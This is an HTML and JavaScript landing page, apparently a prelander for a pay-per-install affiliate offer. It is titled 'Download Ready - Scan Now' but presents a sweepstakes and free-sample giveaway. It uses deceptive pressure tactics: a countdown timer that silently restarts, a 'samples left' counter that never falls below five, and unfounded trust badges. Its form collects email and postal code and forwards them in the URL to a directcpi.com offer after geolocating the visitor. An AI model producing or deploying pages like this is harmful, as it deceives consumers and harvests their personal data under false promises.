<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>üéâ Download Ready - Scan Now </title>
<meta name="description" content="Enter to win ‚Äî limited time sweepstakes. Confirm entry to continue." />
<style>
  :root{
    --bg:#f5f7fb; --card:#fff; --text:#111; --muted:#6b7280;
    --primary:#ff3366; --accent:#ff7aa0;
  }
  .dark{--bg:#0b0f14; --card:#0f1418; --text:#e6eef8; --muted:#9aa6b2; --primary:#4ea1ff;}
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:Inter,Arial,Helvetica,sans-serif;-webkit-font-smoothing:antialiased}
  a{color:inherit;text-decoration:none}
  .page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .card{width:100%;max-width:980px;background:var(--card);border-radius:16px;box-shadow:0 12px 40px rgba(2,6,23,0.08);overflow:hidden;display:grid;grid-template-columns:1fr 420px;gap:24px;padding:28px}
  @media(max-width:920px){.card{grid-template-columns:1fr;padding:18px} .right{order:-1}}
  .headline{font-size:28px;line-height:1.02;margin:0 0 8px;font-weight:700}
  .sub{color:var(--muted);margin:0 0 16px}
  .cta-row{display:flex;gap:12px;align-items:center}
  .btn{background:var(--primary);color:#fff;padding:12px 18px;border-radius:12px;border:0;font-weight:700;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
  .btn.ghost{background:transparent;color:var(--primary);border:2px solid var(--primary)}
  .trust{display:flex;gap:10px;margin-top:12px;color:var(--muted);font-size:13px;flex-wrap:wrap}
  .right{background:linear-gradient(180deg,#fff,#fff);padding:18px;border-radius:12px;display:flex;flex-direction:column;align-items:stretch;justify-content:flex-start}
  .hero-img{width:100%;height:260px;border-radius:10px;overflow:hidden;display:flex;align-items:center;justify-content:center;background:#fff}
  .hero-img img{max-width:100%;height:100%;object-fit:cover}
  .form{margin-top:14px;background:transparent}
  .form .input{width:100%;padding:12px;border-radius:10px;border:1px solid #eee;margin-bottom:10px;font-size:15px}
  .note{font-size:13px;color:var(--muted)}
  .sticky{position:fixed;right:18px;bottom:18px;background:linear-gradient(90deg,var(--primary),var(--accent));color:#fff;padding:12px 18px;border-radius:999px;box-shadow:0 12px 40px rgba(0,0,0,0.18);cursor:pointer;z-index:9999}
  .modal-backdrop{position:fixed;inset:0;background:rgba(2,6,23,0.55);display:flex;align-items:center;justify-content:center;z-index:10000}
  .modal{width:92%;max-width:720px;background:var(--card);padding:22px;border-radius:12px}
  .modal h3{margin:0 0 8px}
  .modal p{color:var(--muted);margin:0 0 14px}
  .count{font-weight:800;color:var(--primary);font-size:20px;margin-left:6px}
  .fadeIn{animation:fadeIn .9s ease both}
  @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
</style>
</head>
<body>

<div class="page">
  <div class="card fadeIn">

    <div>
      <h1 class="headline">üéâ Download Ready - Scan Now</h1>
      <p class="sub">Quick one-step confirmation. No hidden subscriptions. Secure & fair draw.</p>

      <div class="cta-row" style="margin-top:8px">
        <button class="btn" id="openPrelanderBtn">Claim My Spot ‚Üí</button>
        <button class="btn ghost" id="howBtn">How it works</button>
      </div>

      <div class="trust">
        <div>üîí Secure</div>
        <div>‚≠ê 4.8/5 Trustscore</div>
        <div>Only <strong id="samplesLeft">25</strong> samples left</div>
        <div>‚è≥ <span id="countdown" class="count">00:00:00</span></div>
      </div>
    </div>

    <aside class="right">
      <div class="hero-img">
        <img id="heroImage"
          src="https://raw.githubusercontent.com/monir1984017-prog/skin-healthcare/main/front-view-young-male-with-christmas-present.jpg"
          alt="Prize image">
      </div>

      <div class="form">
        <form id="leadForm" onsubmit="return onFormSubmit(event)">
          <input class="input" name="email" type="email" placeholder="Email address" required>
          <input class="input" name="zip" type="text" placeholder="Zip / Postal code" required>
          <label style="display:flex;gap:8px;align-items:center;font-size:13px;margin-bottom:8px">
            <input type="checkbox" id="humanCheck" required> I confirm I am a real person
          </label>
          <button class="btn" type="submit">Confirm & Continue ‚Üí</button>
        </form>
      </div>
    </aside>

  </div>
</div>

<div class="sticky" id="stickyCTA">Claim Now</div>

<!-- Prelander Modal -->
<div id="prelanderModal" class="modal-backdrop" style="display:none">
  <div class="modal">
    <h3>Quick ‚Äî Confirm Your Spot</h3>
    <p>Our free sample program selects winners weekly. Confirming your entry takes 2 minutes.</p>
    <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px">
      <button class="btn ghost" id="modalClose">Not now</button>
      <button class="btn" id="modalProceed">Yes, Continue ‚Üí</button>
    </div>
  </div>
</div>

<script>

// OFFER ROTATION (Your offer link kept EXACTLY)
const OFFERS = {
  "default": "https://www.directcpi.com/view.php?id=5543058&pub=3315800"
};

async function detectCountry(){
  try{
    const res = await fetch('https://ipapi.co/json/');
    const js = await res.json();
    return js.country || null;
  }catch(e){ 
    return null; 
  }
}

async function chooseOffer(){
  const country = await detectCountry();
  if(country && OFFERS[country]) return OFFERS[country];
  return OFFERS["default"];
}

// TIMER + SAMPLES
const TIMER_KEY = 'kitv5_timer_end';
const SAMPLES_KEY = 'kitv5_samples';

function initTimer(){
  let end = localStorage.getItem(TIMER_KEY);
  if(!end){
    end = Date.now() + 10*60*1000;
    localStorage.setItem(TIMER_KEY, end);
  }
  if(!localStorage.getItem(SAMPLES_KEY)) localStorage.setItem(SAMPLES_KEY, "25");
  startCountdown(+end);
}

function startCountdown(endTs){
  const el = document.getElementById('countdown');
  const samplesEl = document.getElementById('samplesLeft');

  function tick(){
    const now = Date.now();
    let diff = endTs - now;
    if(diff <= 0){
      endTs = Date.now() + 10*60*1000;
      localStorage.setItem(TIMER_KEY, endTs);
      let s = Math.max(5,(+localStorage.getItem(SAMPLES_KEY)-1));
      localStorage.setItem(SAMPLES_KEY, s);
      samplesEl.innerText = s;
      diff = endTs - now;
    }
    const m = Math.floor(diff/60000)%60;
    const s2 = Math.floor(diff/1000)%60;
    el.innerText = `00:${String(m).padStart(2,'0')}:${String(s2).padStart(2,'0')}`;
  }
  
  samplesEl.innerText = localStorage.getItem(SAMPLES_KEY);
  tick();
  setInterval(tick,1000);
}

// UI ACTIONS
document.getElementById('openPrelanderBtn')
  .addEventListener('click',()=>{document.getElementById('prelanderModal').style.display='flex';});

document.getElementById('modalClose')
  .addEventListener('click',()=>{document.getElementById('prelanderModal').style.display='none';});

document.getElementById('modalProceed')
  .addEventListener('click',()=>{document.getElementById('prelanderModal').style.display='none';
    document.getElementById('leadForm').scrollIntoView({behavior:'smooth'});});

document.getElementById('stickyCTA')
  .addEventListener('click',()=>{document.getElementById('leadForm').scrollIntoView({behavior:'smooth'})});

document.getElementById('howBtn')
  .addEventListener('click',()=>{alert('Tap Confirm & Continue to go to the confirmation page. Winners chosen weekly.');});

// Append parameters safely (FIXES 404 ERROR)
function appendParams(url, params) {
  const separator = url.includes('?') ? '&' : '?';
  return url + separator + new URLSearchParams(params).toString();
}

// SUBMIT ‚Üí REDIRECT
async function onFormSubmit(e){
  e.preventDefault();
  const f = document.getElementById('leadForm');
  const email = f.email.value.trim();
  const zip = f.zip.value.trim();
  if(!document.getElementById('humanCheck').checked){
    alert("Confirm you are a real person."); 
    return false;
  }
  saveLeadLocally({email,zip});
  const offer = await chooseOffer();

  // SAFE URL BUILD (NO MORE 404)
  const finalURL = appendParams(offer, { email, zip });

  setTimeout(()=>{ window.location.href = finalURL; }, 500);
}

// SAVE LEAD
function saveLeadLocally(lead){
  const arr = JSON.parse(localStorage.getItem('kitv5_leads')||'[]');
  arr.push({...lead,ts:new Date().toISOString()});
  localStorage.setItem('kitv5_leads',JSON.stringify(arr));
}

initTimer();

</script>

</body>
</html>


